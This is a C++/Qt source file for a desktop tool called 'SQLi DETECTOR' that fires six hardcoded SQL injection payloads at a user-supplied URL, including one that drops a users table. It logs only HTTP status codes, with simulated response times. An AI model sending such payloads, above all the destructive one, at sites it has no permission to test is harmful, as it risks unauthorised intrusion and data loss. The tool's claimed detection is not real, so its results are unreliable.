#include <QApplication>
#include <QMainWindow>
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QTableWidget>
#include <QTableWidgetItem>
#include <QPushButton>
#include <QLabel>
#include <QLineEdit>
#include <QTimer>
#include <QDateTime>
#include <QHeaderView>
#include <QSqlDatabase>
#include <QSqlQuery>
#include <QSqlError>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QEventLoop>
#include <QMessageBox>
#include <QFile>
#include <QTextStream>
#include <QDebug>

class SQLiDetector {
public:
    struct AttackRecord {
        int id, attack_number;
        QString ip, site, url, payload, type;
        int response_time, status_code;
        QDateTime timestamp;
    };
    
    static QSqlDatabase db;
    
    static bool initDB() {
        db = QSqlDatabase::addDatabase("QPSQL");
        db.setHostName("localhost");
        db.setPort(5432);
        db.setDatabaseName("sqli_detector");
        db.setUserName("postgres");
        db.setPassword("password");
        
        if (!db.open()) {
            qDebug() << "DB Error:" << db.lastError().text();
            return false;
        }
        
        QSqlQuery query;
        query.exec(R"(
            CREATE TABLE IF NOT EXISTS sqli_attacks (
                id SERIAL PRIMARY KEY,
                attack_number INTEGER UNIQUE NOT NULL,
                ip VARCHAR(45) DEFAULT '127.0.0.1',
                site VARCHAR(255),
                url TEXT,
                payload TEXT,
                type VARCHAR(50),
                response_time INTEGER,
                status_code INTEGER,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        )");
        
        query.exec(R"(
            CREATE TABLE IF NOT EXISTS targets (
                id SERIAL PRIMARY KEY,
                domain VARCHAR(255) UNIQUE,
                scan_count INTEGER DEFAULT 0,
                last_scanned TIMESTAMP
            )
        )");
        
        qDebug() << "PostgreSQL подключён!";
        return true;
    }
    
    static int getNextAttackNumber() {
        QSqlQuery query;
        query.exec("SELECT COALESCE(MAX(attack_number), 0) + 1 FROM sqli_attacks");
        if (query.next()) return query.value(0).toInt();
        return 1;
    }
    
    static bool addAttack(const AttackRecord& record) {
        QSqlQuery query;
        query.prepare(R"(
            INSERT INTO sqli_attacks (attack_number, ip, site, url, payload, type, response_time, status_code)
            VALUES (:num, :ip, :site, :url, :payload, :type, :rtime, :scode)
        )");
        query.bindValue(":num", record.attack_number);
        query.bindValue(":ip", record.ip);
        query.bindValue(":site", record.site);
        query.bindValue(":url", record.url);
        query.bindValue(":payload", record.payload);
        query.bindValue(":type", record.type);
        query.bindValue(":rtime", record.response_time);
        query.bindValue(":scode", record.status_code);
        return query.exec();
    }
    
    static QVector<AttackRecord> getRecentAttacks(int limit = 20) {
        QVector<AttackRecord> attacks;
        QSqlQuery query;
        query.exec(QString("SELECT * FROM sqli_attacks ORDER BY attack_number DESC LIMIT %1").arg(limit));
        
        while (query.next()) {
            AttackRecord rec;
            rec.id = query.value("id").toInt();
            rec.attack_number = query.value("attack_number").toInt();
            rec.ip = query.value("ip").toString();
            rec.site = query.value("site").toString();
            rec.url = query.value("url").toString();
            rec.payload = query.value("payload").toString();
            rec.type = query.value("type").toString();
            rec.response_time = query.value("response_time").toInt();
            rec.status_code = query.value("status_code").toInt();
            rec.timestamp = query.value("timestamp").toDateTime();
            attacks.prepend(rec);  
        }
        return attacks;
    }
    
    static int getTotalAttacks() {
        QSqlQuery query;
        query.exec("SELECT COUNT(*) FROM sqli_attacks");
        if (query.next()) return query.value(0).toInt();
        return 0;
    }
    
    static void clearAll() {
        QSqlQuery query;
        query.exec("DELETE FROM sqli_attacks");
    }
};

QSqlDatabase SQLiDetector::db;

class MainWindow : public QMainWindow {
    Q_OBJECT
public:
    MainWindow(QWidget *parent = nullptr) : QMainWindow(parent) {
        if (!SQLiDetector::initDB()) {
            QMessageBox::critical(nullptr, "ОШИБКА", 
                "PostgreSQL недоступен!\nУстановите: sudo apt install postgresql libqt6sql6-psql\nСоздайте БД: sudo -u postgres createdb sqli_detector");
            exit(1);
        }
        
        setupUI();
        startTimer();
        resize(1600, 900);
        setWindowTitle("SQLi DETECTOR");
    }
    
private:
    void setupUI() {
        QWidget *central = new QWidget;
        setCentralWidget(central);
        QVBoxLayout *mainLayout = new QVBoxLayout(central);
        
        title = new QLabel("SQLi DETECTOR");
        title->setStyleSheet("font-size: 28px; font-weight: bold; color: #e74c3c; padding: 20px;");
        title->setAlignment(Qt::AlignCenter);
        mainLayout->addWidget(title);
        
        QHBoxLayout *targetLayout = new QHBoxLayout();
        targetInput = new QLineEdit("http://testphp.vulnweb.com");
        targetInput->setPlaceholderText("http://testphp.vulnweb.com (легальный тест!)");
        targetInput->setStyleSheet("font-size: 16px; padding: 12px; border: 2px solid #007bff; border-radius: 8px;");
        targetLayout->addWidget(targetInput);
        
        scanBtn = new QPushButton("LIVE SCAN");
        scanBtn->setStyleSheet("font-size: 16px; font-weight: bold; padding: 12px 24px; background: #007bff; color: white; border-radius: 8px;");
        targetLayout->addWidget(scanBtn);
        mainLayout->addLayout(targetLayout);
        
        table = new QTableWidget(0, 8);
        table->setHorizontalHeaderLabels({"#", "IP", "Сайт", "URL", "Payload", "Тип", "Status", "Время"});
        table->horizontalHeader()->setStretchLastSection(true);
        table->setAlternatingRowColors(true);
        table->setStyleSheet("font-size: 12px; gridline-color: #dee2e6;");
        mainLayout->addWidget(table);
        
        QHBoxLayout *btnLayout = new QHBoxLayout();
        quickBtn = new QPushButton("TEST VULNWEB");
        clearBtn = new QPushButton("CLEAR DB");
        exportBtn = new QPushButton("EXPORT CSV");
        
        quickBtn->setStyleSheet("font-size: 14px; padding: 12px; background: #28a745; color: white; border-radius: 8px;");
        clearBtn->setStyleSheet("font-size: 14px; padding: 12px; background: #dc3545; color: white; border-radius: 8px;");
        exportBtn->setStyleSheet("font-size: 14px; padding: 12px; background: #ffc107; color: black; border-radius: 8px;");
        
        btnLayout->addWidget(quickBtn);
        btnLayout->addWidget(clearBtn);
        btnLayout->addWidget(exportBtn);
        mainLayout->addLayout(btnLayout);
        
        statusLabel = new QLabel("PostgreSQL подключён | Атак: 0");
        statusLabel->setStyleSheet("font-size: 16px; padding: 15px; background: #f8f9fa; border-radius: 8px;");
        statusLabel->setAlignment(Qt::AlignCenter);
        mainLayout->addWidget(statusLabel);
        
        connect(scanBtn, &QPushButton::clicked, this, &MainWindow::scanTarget);
        connect(quickBtn, &QPushButton::clicked, this, &MainWindow::quickScan);
        connect(clearBtn, &QPushButton::clicked, this, &MainWindow::clearDatabase);
        connect(exportBtn, &QPushButton::clicked, this, &MainWindow::exportCSV);
    }
    
    void startTimer() {
        uiTimer = new QTimer(this);
        connect(uiTimer, &QTimer::timeout, [this]() { updateTable(); });
        uiTimer->start(1000);  
    }
    
    QStringList getSQLiPayloads() {
        return {
            "id=1' OR 1=1 --",            //  BOOLEAN
            "id=1 UNION SELECT 1,2,3 --", //  UNION
            "id=1; DROP TABLE users --",  //  DESTRUCTIVE
            "admin' --",                  //  COMMENT
            "id=1 OR '1'='1",             //  BOOLEAN
            "id=1' SLEEP(5) --"           //  TIME-BASED
        };
    }
    
    QStringList getSQLiTypes() {
        return {
            "🔴 BOOLEAN", "🟡 UNION", "DESTRUCTIVE",
            "🟢 COMMENT", "🔴 BOOLEAN", "TIME-BASED"
        };
    }
    
    int scanSite(const QString& baseUrl, const QString& payload) {
        QEventLoop loop;
        QNetworkAccessManager manager;
        
        QUrl url(baseUrl + "?" + payload);
        QNetworkRequest request(url);
        request.setTransferTimeout(5000);  // 5 секунд
        
        QNetworkReply *reply = manager.get(request);
        connect(reply, &QNetworkReply::finished, &loop, &QEventLoop::quit);
        
        loop.exec();  // Ждём ответа!
        
        int status = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
        int time = QDateTime::currentMSecsSinceEpoch() % 10000;  // Симуляция времени
        
        reply->deleteLater();
        return status;
    }
    
    void scanTarget() {
        QString target = targetInput->text().trimmed();
        if (target.isEmpty()) {
            statusLabel->setText("Введите URL!");
            return;
        }
        
        if (!target.startsWith("http")) {
            target = "http://" + target;
        }
        
        statusLabel->setText(QString("🔍 LIVE SCAN %1...").arg(target));
        scanBtn->setEnabled(false);
        
        QStringList payloads = getSQLiPayloads();
        QStringList types = getSQLiTypes();
        QString ip = "127.0.0.1";
        
        for (int i = 0; i < payloads.size(); ++i) {
            int attackNum = SQLiDetector::getNextAttackNumber();
            int status = scanSite(target, payloads[i]);
            
            SQLiDetector::AttackRecord rec;
            rec.attack_number = attackNum;
            rec.ip = ip;
            rec.site = target;
            rec.url = "/?" + payloads[i].left(30) + "...";
            rec.payload = payloads[i];
            rec.type = types[i];
            rec.status_code = status;
            rec.response_time = 500 + i * 100;  // Симуляция времени
            
            SQLiDetector::addAttack(rec);
            qDebug() << QString("#%1 %2 → %3").arg(attackNum).arg(target).arg(status);
        }
        
        statusLabel->setText(QString("SCAN COMPLETE | Атак: %1").arg(SQLiDetector::getTotalAttacks()));
        scanBtn->setEnabled(true);
    }
    
    void quickScan() {
        targetInput->setText("http://testphp.vulnweb.com");
        scanTarget();
    }
    
    void clearDatabase() {
        SQLiDetector::clearAll();
        statusLabel->setText("🟢 БАЗА ОЧИЩЕНА!");
        updateTable();
    }
    
    void exportCSV() {
        QFile file("sqli_attacks.csv");
        if (!file.open(QIODevice::WriteOnly | QIODevice::Truncate)) {
            statusLabel->setText("Ошибка CSV!");
            return;
        }
        
        QTextStream out(&file);
        out << "ID,Number,IP,Site,URL,Payload,Type,Status,Time\n";
        
        QSqlQuery query("SELECT * FROM sqli_attacks ORDER BY attack_number DESC");
        while (query.next()) {
            out << query.value("id").toString() << ","
                << query.value("attack_number").toString() << ","
                << query.value("ip").toString() << ","
                << query.value("site").toString() << ","
                << query.value("url").toString().left(50) << ","
                << query.value("payload").toString().left(50) << ","
                << query.value("type").toString() << ","
                << query.value("status_code").toString() << ","
                << query.value("timestamp").toString() << "\n";
        }
        
        statusLabel->setText(QString("CSV экспортирован! (%1 строк)").arg(SQLiDetector::getTotalAttacks()));
    }
    
    void updateTable() {
        auto attacks = SQLiDetector::getRecentAttacks(20);
        table->setRowCount(attacks.size());
        
        for (int i = 0; i < attacks.size(); ++i) {
            const auto& attack = attacks[i];
            
            table->setItem(i, 0, new QTableWidgetItem(QString("#%1").arg(attack.attack_number)));
            table->setItem(i, 1, new QTableWidgetItem(attack.ip));
            table->setItem(i, 2, new QTableWidgetItem(attack.site));
            table->setItem(i, 3, new QTableWidgetItem(attack.url));
            table->setItem(i, 4, new QTableWidgetItem(attack.payload.left(40) + "..."));
            table->setItem(i, 5, new QTableWidgetItem(attack.type));
            table->setItem(i, 6, new QTableWidgetItem(QString("%1").arg(attack.status_code)));
            table->setItem(i, 7, new QTableWidgetItem(attack.timestamp.toString("HH:mm:ss")));
            
            QTableWidgetItem* typeItem = table->item(i, 5);
            if (attack.type.contains("🔴")) typeItem->setBackground(QColor(255, 100, 100));
            else if (attack.type.contains("🟡")) typeItem->setBackground(QColor(255, 200, 100));
            else if (attack.type.contains("🔥")) typeItem->setBackground(QColor(200, 50, 50));
            else if (attack.type.contains("🟢")) typeItem->setBackground(QColor(100, 255, 100));
        }
        
        statusLabel->setText(QString("PostgreSQL | Атак: %1 | Цель: %2")
            .arg(SQLiDetector::getTotalAttacks()).arg(targetInput->text()));
    }
    
    QLabel *title, *statusLabel;
    QTableWidget *table;
    QLineEdit *targetInput;
    QPushButton *scanBtn, *quickBtn, *clearBtn, *exportBtn;
    QTimer *uiTimer;
};

int main(int argc, char *argv[]) {
    QApplication app(argc, argv);
    app.setStyle("Fusion");
    MainWindow window;
    window.show();
    return app.exec();
}

#include "main_real.moc"
